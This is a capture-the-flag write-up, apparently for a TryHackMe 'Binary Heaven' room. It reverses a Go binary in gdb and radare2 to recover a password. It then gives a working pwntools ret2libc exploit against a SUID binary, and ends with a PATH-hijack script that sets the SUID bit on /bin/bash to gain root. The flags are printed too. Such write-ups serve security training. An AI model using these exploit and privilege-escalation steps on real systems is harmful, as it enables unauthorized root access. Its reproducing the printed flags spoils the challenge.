   0x00000000004a5337 <+119>:   mov    %rcx,0xa8(%rsp)
   0x00000000004a533f <+127>:   lea    0x441ea(%rip),%rax        # 0x4e9530
   0x00000000004a5346 <+134>:   mov    %rax,0xb0(%rsp)
   0x00000000004a534e <+142>:   mov    0xc395b(%rip),%rax        # 0x568cb0 <os.Stdout>
   0x00000000004a5355 <+149>:   lea    0x45a04(%rip),%rdx        # 0x4ead60 <go.itab.*os.File,io.Writer>                                                                                
   0x00000000004a535c <+156>:   mov    %rdx,(%rsp)
   0x00000000004a5360 <+160>:   mov    %rax,0x8(%rsp)
   0x00000000004a5365 <+165>:   lea    0x98(%rsp),%rax
   0x00000000004a536d <+173>:   mov    %rax,0x10(%rsp)
   0x00000000004a5372 <+178>:   movq   $0x2,0x18(%rsp)
   0x00000000004a537b <+187>:   movq   $0x2,0x20(%rsp)
   0x00000000004a5384 <+196>:   call   0x499620 <fmt.Fprintln>
   0x00000000004a5389 <+201>:   lea    0xbb30(%rip),%rax        # 0x4b0ec0
   0x00000000004a5390 <+208>:   mov    %rax,(%rsp)
   0x00000000004a5394 <+212>:   call   0x40cde0 <runtime.newobject>
   0x00000000004a5399 <+217>:   mov    0x8(%rsp),%rax
   0x00000000004a539e <+222>:   mov    %rax,0x40(%rsp)
   0x00000000004a53a3 <+227>:   xorps  %xmm0,%xmm0
   0x00000000004a53a6 <+230>:   movups %xmm0,0x48(%rsp)
   0x00000000004a53ab <+235>:   lea    0x95ee(%rip),%rcx        # 0x4ae9a0
   0x00000000004a53b2 <+242>:   mov    %rcx,0x48(%rsp)
   0x00000000004a53b7 <+247>:   mov    %rax,0x50(%rsp)
   0x00000000004a53bc <+252>:   mov    0xc38e5(%rip),%rcx        # 0x568ca8 <os.Stdin>
   0x00000000004a53c3 <+259>:   lea    0x45976(%rip),%rdx        # 0x4ead40 <go.itab.*os.File,io.Reader>                                                                                
   0x00000000004a53ca <+266>:   mov    %rdx,(%rsp)
   0x00000000004a53ce <+270>:   mov    %rcx,0x8(%rsp)
   0x00000000004a53d3 <+275>:   lea    0x48(%rsp),%rcx
   0x00000000004a53d8 <+280>:   mov    %rcx,0x10(%rsp)
   0x00000000004a53dd <+285>:   movq   $0x1,0x18(%rsp)
   0x00000000004a53e6 <+294>:   movq   $0x1,0x20(%rsp)
   0x00000000004a53ef <+303>:   call   0x49f8c0 <fmt.Fscanln>
   0x00000000004a53f4 <+308>:   mov    0x40(%rsp),%rax
   0x00000000004a53f9 <+313>:   mov    0x8(%rax),%rcx
   0x00000000004a53fd <+317>:   mov    (%rax),%rax
   0x00000000004a5400 <+320>:   cmp    $0xb,%rcx
   0x00000000004a5404 <+324>:   je     0x4a54a1 <main.main+481>
   0x00000000004a540a <+330>:   lea    0x24ba9(%rip),%rax        # 0x4c9fba
   0x00000000004a5411 <+337>:   mov    %rax,(%rsp)
   0x00000000004a5415 <+341>:   movq   $0x5,0x8(%rsp)
   0x00000000004a541e <+350>:   xchg   %ax,%ax
   0x00000000004a5420 <+352>:   call   0x40a120 <runtime.convTstring>
   0x00000000004a5425 <+357>:   mov    0x10(%rsp),%rax
   0x00000000004a542a <+362>:   xorps  %xmm0,%xmm0
   0x00000000004a542d <+365>:   movups %xmm0,0x58(%rsp)
   0x00000000004a5432 <+370>:   movups %xmm0,0x68(%rsp)
   0x00000000004a5437 <+375>:   lea    0xba82(%rip),%rcx        # 0x4b0ec0
   0x00000000004a543e <+382>:   mov    %rcx,0x58(%rsp)
   0x00000000004a5443 <+387>:   mov    %rax,0x60(%rsp)
   0x00000000004a5448 <+392>:   mov    %rcx,0x68(%rsp)
   0x00000000004a544d <+397>:   lea    0x440fc(%rip),%rax        # 0x4e9550
   0x00000000004a5454 <+404>:   mov    %rax,0x70(%rsp)
   0x00000000004a5459 <+409>:   mov    0xc3850(%rip),%rax        # 0x568cb0 <os.Stdout>
   0x00000000004a5460 <+416>:   lea    0x458f9(%rip),%rcx        # 0x4ead60 <go.itab.*os.File,io.Writer>                                                                                
   0x00000000004a5467 <+423>:   mov    %rcx,(%rsp)
   0x00000000004a546b <+427>:   mov    %rax,0x8(%rsp)
   0x00000000004a5470 <+432>:   lea    0x58(%rsp),%rax
   0x00000000004a5475 <+437>:   mov    %rax,0x10(%rsp)
   0x00000000004a547a <+442>:   movq   $0x2,0x18(%rsp)
   0x00000000004a5483 <+451>:   movq   $0x2,0x20(%rsp)
   0x00000000004a548c <+460>:   call   0x499620 <fmt.Fprintln>
   0x00000000004a5491 <+465>:   mov    0xb8(%rsp),%rbp
   0x00000000004a5499 <+473>:   add    $0xc0,%rsp
   0x00000000004a54a0 <+480>:   ret    
   0x00000000004a54a1 <+481>:   mov    %rax,(%rsp)
   0x00000000004a54a5 <+485>:   lea    0x2585f(%rip),%rax        # 0x4cad0b
   0x00000000004a54ac <+492>:   mov    %rax,0x8(%rsp)
   0x00000000004a54b1 <+497>:   mov    %rcx,0x10(%rsp)
   0x00000000004a54b6 <+502>:   call   0x4022e0 <runtime.memequal>
   0x00000000004a54bb <+507>:   cmpb   $0x0,0x18(%rsp)
   0x00000000004a54c0 <+512>:   je     0x4a540a <main.main+330>
   0x00000000004a54c6 <+518>:   lea    0x24af2(%rip),%rax        # 0x4c9fbf
   0x00000000004a54cd <+525>:   mov    %rax,(%rsp)
   0x00000000004a54d1 <+529>:   movq   $0x5,0x8(%rsp)
   0x00000000004a54da <+538>:   call   0x40a120 <runtime.convTstring>
   0x00000000004a54df <+543>:   mov    0x10(%rsp),%rax
   0x00000000004a54e4 <+548>:   xorps  %xmm0,%xmm0
   0x00000000004a54e7 <+551>:   movups %xmm0,0x78(%rsp)
   0x00000000004a54ec <+556>:   movups %xmm0,0x88(%rsp)
   0x00000000004a54f4 <+564>:   lea    0xb9c5(%rip),%rcx        # 0x4b0ec0
   0x00000000004a54fb <+571>:   mov    %rcx,0x78(%rsp)
   0x00000000004a5500 <+576>:   mov    %rax,0x80(%rsp)
   0x00000000004a5508 <+584>:   mov    %rcx,0x88(%rsp)
   0x00000000004a5510 <+592>:   lea    0x44029(%rip),%rax        # 0x4e9540
   0x00000000004a5517 <+599>:   mov    %rax,0x90(%rsp)
   0x00000000004a551f <+607>:   mov    0xc378a(%rip),%rax        # 0x568cb0 <os.Stdout>
   0x00000000004a5526 <+614>:   lea    0x45833(%rip),%rcx        # 0x4ead60 <go.itab.*os.File,io.Writer>                                                                                
   0x00000000004a552d <+621>:   mov    %rcx,(%rsp)
   0x00000000004a5531 <+625>:   mov    %rax,0x8(%rsp)
   0x00000000004a5536 <+630>:   lea    0x78(%rsp),%rax
   0x00000000004a553b <+635>:   mov    %rax,0x10(%rsp)
   0x00000000004a5540 <+640>:   movq   $0x2,0x18(%rsp)
   0x00000000004a5549 <+649>:   movq   $0x2,0x20(%rsp)
   0x00000000004a5552 <+658>:   call   0x499620 <fmt.Fprintln>
   0x00000000004a5557 <+663>:   jmp    0x4a5491 <main.main+465>
   0x00000000004a555c <+668>:   nopl   0x0(%rax)
   0x00000000004a5560 <+672>:   call   0x461620 <runtime.morestack_noctxt>
   0x00000000004a5565 <+677>:   jmp    0x4a52c0 <main.main>
End of assembler dump.
(gdb) break *0x00000000004a54b6
Note: breakpoint 2 also set at pc 0x4a54b6.
Breakpoint 3 at 0x4a54b6: file /mnt/c/Users/User/Downloads/binary_heaven/password.go, line 14.
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) n
Program not restarted.
(gdb) c
Continuing.
 
Say the magic word >>                                                                       
123456789AB


***radare 2***
                                                                                            
┌──(angr)─(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ r2 -d -A angel_B
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Find function and symbol names from golang binaries (aang)
[x] Found 1860 symbols and saved them at sym.go.*
[x] Analyze all flags starting with sym.go. (aF @@f:sym.go.*)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00464700]> pdf @sym.main.main
            ;-- sym.go.main.main:
            ; CODE XREF from sym.main.main @ 0x4a5565
┌ 678: sym.main.main ();
│           ; var int64_t var_8h @ rsp+0x8
│           ; var int64_t var_10h @ rsp+0x10
│           ; var int64_t var_18h @ rsp+0x18
│           ; var int64_t var_20h @ rsp+0x20
│           ; var int64_t var_40h @ rsp+0x40
│           ; var int64_t var_48h @ rsp+0x48
│           ; var int64_t var_50h @ rsp+0x50
│           ; var int64_t var_58h @ rsp+0x58
│           ; var int64_t var_60h @ rsp+0x60
│           ; var int64_t var_68h @ rsp+0x68
│           ; var int64_t var_70h @ rsp+0x70
│           ; var int64_t var_78h @ rsp+0x78
│           ; var int64_t var_80h @ rsp+0x80
│           ; var int64_t var_88h @ rsp+0x88
│           ; var int64_t var_90h @ rsp+0x90
│           ; var int64_t var_98h @ rsp+0x98
│           ; var int64_t var_a0h @ rsp+0xa0
│           ; var int64_t var_a8h @ rsp+0xa8
│           ; var int64_t var_b0h @ rsp+0xb0
│           ; var int64_t var_b8h @ rsp+0xb8
│       ┌─> 0x004a52c0      64488b0c25f8.  mov rcx, qword fs:[0xfffffffffffffff8]
│       ╎   0x004a52c9      488d4424c0     lea rax, [rsp - 0x40]
│       ╎   0x004a52ce      483b4110       cmp rax, qword [rcx + 0x10]
│      ┌──< 0x004a52d2      0f8688020000   jbe 0x4a5560
│      │╎   0x004a52d8      4881ecc00000.  sub rsp, 0xc0
│      │╎   0x004a52df      4889ac24b800.  mov qword [var_b8h], rbp
│      │╎   0x004a52e7      488dac24b800.  lea rbp, [var_b8h]
│      │╎   0x004a52ef      488d05ce4c02.  lea rax, [0x004c9fc4]
│      │╎   0x004a52f6      48890424       mov qword [rsp], rax
│      │╎   0x004a52fa      48c744240805.  mov qword [var_8h], 5
│      │╎   0x004a5303      e8184ef6ff     call sym.runtime.convTstring
│      │╎   0x004a5308      488b442410     mov rax, qword [var_10h]
│      │╎   0x004a530d      0f57c0         xorps xmm0, xmm0
│      │╎   0x004a5310      0f1184249800.  movups xmmword [var_98h], xmm0
│      │╎   0x004a5318      0f118424a800.  movups xmmword [var_a8h], xmm0
│      │╎   0x004a5320      488d0d99bb00.  lea rcx, [0x004b0ec0]
│      │╎   0x004a5327      48898c249800.  mov qword [var_98h], rcx
│      │╎   0x004a532f      48898424a000.  mov qword [var_a0h], rax
│      │╎   0x004a5337      48898c24a800.  mov qword [var_a8h], rcx
│      │╎   0x004a533f      488d05ea4104.  lea rax, [0x004e9530]
│      │╎   0x004a5346      48898424b000.  mov qword [var_b0h], rax
│      │╎   0x004a534e      488b055b390c.  mov rax, qword [obj.os.Stdout] ; [0x568cb0:8]=0
│      │╎   0x004a5355      488d15045a04.  lea rdx, obj.go.itab.os.File_io.Writer ; 0x4ead60
│      │╎   0x004a535c      48891424       mov qword [rsp], rdx
│      │╎   0x004a5360      4889442408     mov qword [var_8h], rax
│      │╎   0x004a5365      488d84249800.  lea rax, [var_98h]
│      │╎   0x004a536d      4889442410     mov qword [var_10h], rax
│      │╎   0x004a5372      48c744241802.  mov qword [var_18h], 2
│      │╎   0x004a537b      48c744242002.  mov qword [var_20h], 2
│      │╎   0x004a5384      e89742ffff     call sym.fmt.Fprintln
│      │╎   0x004a5389      488d0530bb00.  lea rax, [0x004b0ec0]
│      │╎   0x004a5390      48890424       mov qword [rsp], rax
│      │╎   0x004a5394      e8477af6ff     call sym.runtime.newobject
│      │╎   0x004a5399      488b442408     mov rax, qword [var_8h]
│      │╎   0x004a539e      4889442440     mov qword [var_40h], rax
│      │╎   0x004a53a3      0f57c0         xorps xmm0, xmm0
│      │╎   0x004a53a6      0f11442448     movups xmmword [var_48h], xmm0
│      │╎   0x004a53ab      488d0dee9500.  lea rcx, [0x004ae9a0]
│      │╎   0x004a53b2      48894c2448     mov qword [var_48h], rcx
│      │╎   0x004a53b7      4889442450     mov qword [var_50h], rax
│      │╎   0x004a53bc      488b0de5380c.  mov rcx, qword [obj.os.Stdin] ; [0x568ca8:8]=0
│      │╎   0x004a53c3      488d15765904.  lea rdx, obj.go.itab.os.File_io.Reader ; 0x4ead40
│      │╎   0x004a53ca      48891424       mov qword [rsp], rdx
│      │╎   0x004a53ce      48894c2408     mov qword [var_8h], rcx
│      │╎   0x004a53d3      488d4c2448     lea rcx, [var_48h]
│      │╎   0x004a53d8      48894c2410     mov qword [var_10h], rcx
│      │╎   0x004a53dd      48c744241801.  mov qword [var_18h], 1
│      │╎   0x004a53e6      48c744242001.  mov qword [var_20h], 1
│      │╎   0x004a53ef      e8cca4ffff     call sym.fmt.Fscanln
│      │╎   0x004a53f4      488b442440     mov rax, qword [var_40h]
│      │╎   0x004a53f9      488b4808       mov rcx, qword [rax + 8]
│      │╎   0x004a53fd      488b00         mov rax, qword [rax]
│      │╎   0x004a5400      4883f90b       cmp rcx, 0xb                ; 11
│     ┌───< 0x004a5404      0f8497000000   je 0x4a54a1
│     ││╎   ; CODE XREF from sym.main.main @ 0x4a54c0
│    ┌────> 0x004a540a      488d05a94b02.  lea rax, [0x004c9fba]
│    ╎││╎   0x004a5411      48890424       mov qword [rsp], rax
│    ╎││╎   0x004a5415      48c744240805.  mov qword [var_8h], 5
│    ╎││╎   0x004a541e      6690           nop
│    ╎││╎   0x004a5420      e8fb4cf6ff     call sym.runtime.convTstring
│    ╎││╎   0x004a5425      488b442410     mov rax, qword [var_10h]
│    ╎││╎   0x004a542a      0f57c0         xorps xmm0, xmm0
│    ╎││╎   0x004a542d      0f11442458     movups xmmword [var_58h], xmm0
│    ╎││╎   0x004a5432      0f11442468     movups xmmword [var_68h], xmm0
│    ╎││╎   0x004a5437      488d0d82ba00.  lea rcx, [0x004b0ec0]
│    ╎││╎   0x004a543e      48894c2458     mov qword [var_58h], rcx
│    ╎││╎   0x004a5443      4889442460     mov qword [var_60h], rax
│    ╎││╎   0x004a5448      48894c2468     mov qword [var_68h], rcx
│    ╎││╎   0x004a544d      488d05fc4004.  lea rax, [0x004e9550]
│    ╎││╎   0x004a5454      4889442470     mov qword [var_70h], rax
│    ╎││╎   0x004a5459      488b0550380c.  mov rax, qword [obj.os.Stdout] ; [0x568cb0:8]=0
│    ╎││╎   0x004a5460      488d0df95804.  lea rcx, obj.go.itab.os.File_io.Writer ; 0x4ead60
│    ╎││╎   0x004a5467      48890c24       mov qword [rsp], rcx
│    ╎││╎   0x004a546b      4889442408     mov qword [var_8h], rax
│    ╎││╎   0x004a5470      488d442458     lea rax, [var_58h]
│    ╎││╎   0x004a5475      4889442410     mov qword [var_10h], rax
│    ╎││╎   0x004a547a      48c744241802.  mov qword [var_18h], 2
│    ╎││╎   0x004a5483      48c744242002.  mov qword [var_20h], 2
│    ╎││╎   0x004a548c      e88f41ffff     call sym.fmt.Fprintln
│    ╎││╎   ; CODE XREF from sym.main.main @ 0x4a5557
│   ┌─────> 0x004a5491      488bac24b800.  mov rbp, qword [var_b8h]
│   ╎╎││╎   0x004a5499      4881c4c00000.  add rsp, 0xc0
│   ╎╎││╎   0x004a54a0      c3             ret
│   ╎╎││╎   ; CODE XREF from sym.main.main @ 0x4a5404
│   ╎╎└───> 0x004a54a1      48890424       mov qword [rsp], rax
│   ╎╎ │╎   0x004a54a5      488d055f5802.  lea rax, [0x004cad0b]       ; "GOg0esGrrr!IdeographicMedefaidrinNandinagariNew_Tai_LueOld_PersianOld_SogdianPau_Cin_HauSignWritingSoft_DottedWarang_CitiWhite_"                                                                          
│   ╎╎ │╎   0x004a54ac      4889442408     mov qword [var_8h], rax
│   ╎╎ │╎   0x004a54b1      48894c2410     mov qword [var_10h], rcx
│   ╎╎ │╎   0x004a54b6      e825cef5ff     call sym.runtime.memequal
│   ╎╎ │╎   0x004a54bb      807c241800     cmp byte [var_18h], 0
│   ╎└────< 0x004a54c0      0f8444ffffff   je 0x4a540a
│   ╎  │╎   0x004a54c6      488d05f24a02.  lea rax, [0x004c9fbf]
│   ╎  │╎   0x004a54cd      48890424       mov qword [rsp], rax
│   ╎  │╎   0x004a54d1      48c744240805.  mov qword [var_8h], 5
│   ╎  │╎   0x004a54da      e8414cf6ff     call sym.runtime.convTstring
│   ╎  │╎   0x004a54df      488b442410     mov rax, qword [var_10h]
│   ╎  │╎   0x004a54e4      0f57c0         xorps xmm0, xmm0
│   ╎  │╎   0x004a54e7      0f11442478     movups xmmword [var_78h], xmm0
│   ╎  │╎   0x004a54ec      0f1184248800.  movups xmmword [var_88h], xmm0
│   ╎  │╎   0x004a54f4      488d0dc5b900.  lea rcx, [0x004b0ec0]
│   ╎  │╎   0x004a54fb      48894c2478     mov qword [var_78h], rcx
│   ╎  │╎   0x004a5500      488984248000.  mov qword [var_80h], rax
│   ╎  │╎   0x004a5508      48898c248800.  mov qword [var_88h], rcx
│   ╎  │╎   0x004a5510      488d05294004.  lea rax, [0x004e9540]
│   ╎  │╎   0x004a5517      488984249000.  mov qword [var_90h], rax
│   ╎  │╎   0x004a551f      488b058a370c.  mov rax, qword [obj.os.Stdout] ; [0x568cb0:8]=0
│   ╎  │╎   0x004a5526      488d0d335804.  lea rcx, obj.go.itab.os.File_io.Writer ; 0x4ead60
│   ╎  │╎   0x004a552d      48890c24       mov qword [rsp], rcx
│   ╎  │╎   0x004a5531      4889442408     mov qword [var_8h], rax
│   ╎  │╎   0x004a5536      488d442478     lea rax, [var_78h]
│   ╎  │╎   0x004a553b      4889442410     mov qword [var_10h], rax
│   ╎  │╎   0x004a5540      48c744241802.  mov qword [var_18h], 2
│   ╎  │╎   0x004a5549      48c744242002.  mov qword [var_20h], 2
│   ╎  │╎   0x004a5552      e8c940ffff     call sym.fmt.Fprintln
│   └─────< 0x004a5557      e935ffffff     jmp 0x4a5491
..
│      │╎   ; CODE XREF from sym.main.main @ 0x4a52d2
│      └──> 0x004a5560      e8bbc0fbff     call sym.runtime.morestack_noctxt
└       └─< 0x004a5565      e956fdffff     jmp sym.main.main
[0x00464700]> 



What is the password? GOg0esGrrr!

What is the flag? (ssh) THM{crack3d_th3_gu4rd1an}

──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ scp guardian@10.10.66.17:/home/guardian/pwn_me /home/kali/Downloads/BinaryHeaven
guardian@10.10.66.17's password: 
pwn_me                                                    100%   15KB  23.5KB/s   00:00    


Can you become the binexgod?
Answer the questions below
binexgod_flag.txt
 
 Task 3 - Return to the origins

There is another binary file named pwn_me and it has SUID bit set for user binexgod. Therefore, a logical assumption at this point would be, exploiting this binary should escalate us to user binexgod.

It leaks the address of system, so we can bypass ASLR. Now, we have to find the offset for rip. we can use pwntools cyclic for creating it. Run cyclic <length>

Put the pattern in temporary file, open the binary in gdb and run it with supplying that pattern. This will cause segfault. Take the value it gave and use cyclic -l value to find the offset

Now we can automate the remaining ROP chain using pwntools.

from pwn import *

elf = context.binary = ELF('./pwn_me')
libc = elf.libc
p = process()

#get the leaked address
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

#set our libc address according to the leaked address
libc.address = system_leak - libc.sym['system']
log.success('LIBC base: {}'.format(hex(libc.address)))

#get location of binsh from libc
binsh = next(libc.search(b'/bin/sh'))

#build the rop chain
rop = ROP(libc)
rop.raw('A' * 32)
rop.system(binsh)

#send our rop chain
p.sendline(rop.chain())

#Get the shell
p.interactive()


uardian@heaven:~$ nano exploit.py
guardian@heaven:~$ python exploit.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/guardian/.cache/.pwntools-cache-3.5/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never

[3]+  Stopped                 python exploit.py
guardian@heaven:~$ ls -la
total 56
drwxr-x--- 4 guardian guardian  4096 Aug  3 19:01 .
drwxr-xr-x 5 root     root      4096 Mar  1  2021 ..
-rw-rw-r-- 1 guardian guardian     0 May  8  2021 .bash_history
-rw-r--r-- 1 guardian guardian   220 Mar  1  2021 .bash_logout
-rw-r--r-- 1 guardian guardian  3771 Mar  1  2021 .bashrc
drwx------ 3 guardian guardian  4096 Mar  4  2021 .cache
-rw-rw-r-- 1 guardian guardian   550 Aug  3 19:01 exploit.py
-rw-r--r-- 1 root     root        26 Mar 15  2021 guardian_flag.txt
drwxrwxr-x 2 guardian guardian  4096 Mar  4  2021 .nano
-rw-r--r-- 1 guardian guardian   655 Mar  1  2021 .profile
-rwsr-sr-x 1 binexgod binexgod 15772 May  8  2021 pwn_me
-rw------- 1 guardian guardian   228 May  8  2021 .python_history
guardian@heaven:~$ cd .cache
guardian@heaven:~/.cache$ ls
motd.legal-displayed
guardian@heaven:~/.cache$ ls -la
total 12
drwx------ 3 guardian guardian 4096 Mar  4  2021 .
drwxr-x--- 4 guardian guardian 4096 Aug  3 19:01 ..
-rw-r--r-- 1 guardian guardian    0 Mar  1  2021 motd.legal-displayed
drwxrwxr-x 2 guardian guardian 4096 Mar  4  2021 .pwntools-cache-3.5                                                              
guardian@heaven:~/.cache$ cd .pwntools-cache-3.5/
guardian@heaven:~/.cache/.pwntools-cache-3.5$ ls -la
total 8
drwxrwxr-x 2 guardian guardian 4096 Mar  4  2021 .
drwx------ 3 guardian guardian 4096 Mar  4  2021 ..
-rw-rw-r-- 1 guardian guardian    0 May  8  2021 update
guardian@heaven:~/.cache/.pwntools-cache-3.5$ cat update
guardian@heaven:~/.cache/.pwntools-cache-3.5$ nano update
guardian@heaven:~/.cache/.pwntools-cache-3.5$ cd ..
guardian@heaven:~/.cache$ cd ..
guardian@heaven:~$ ls
exploit.py  guardian_flag.txt  pwn_me
guardian@heaven:~$ python exploit.py
[*] '/home/guardian/pwn_me'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/lib32/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/guardian/pwn_me': pid 1974
[+] LIBC base: 0xf7de1000
[*] Loading gadgets for '/lib32/libc-2.23.so'
[*] Switching to interactive mode
$ id
uid=1002(binexgod) gid=1001(guardian) groups=1001(guardian)
$ ls
exploit.py  guardian_flag.txt  pwn_me
$ find -name binexgod_flag.txt
find: ‘./.cache’: Permission denied
$ whoami
binexgod
$ ls
exploit.py  guardian_flag.txt  pwn_me
$ pwd
/home/guardian
$ cd ..
$ ls
binexgod  guardian  lost+found
$ cd binexgod
$ ls
binexgod_flag.txt  secret_of_heaven  vuln  vuln.c
$ cat binexgog_flag.txt
cat: binexgog_flag.txt: No such file or directory
$ cat binexgod_flag.txt
THM{b1n3xg0d_pwn3d}

 ls
binexgod_flag.txt  echo  secret_of_heaven  vuln  vuln.c
$ cat vuln.c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo Get out of heaven lol");
}
$ echo "#!/bin/bash\nchmod u+s /bin/bash" > echo
$ chmod u+x echo
$ PATH=`pwd`:$PATH ./vuln
$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
$ bash -p
$ id
uid=1002(binexgod) gid=1001(guardian) euid=0(root) groups=1001(guardian)
$ cd /root
$ ls
root.txt
$ cat root.txt
THM{r00t_of_th3_he4v3n}

```

[[Autopsy]]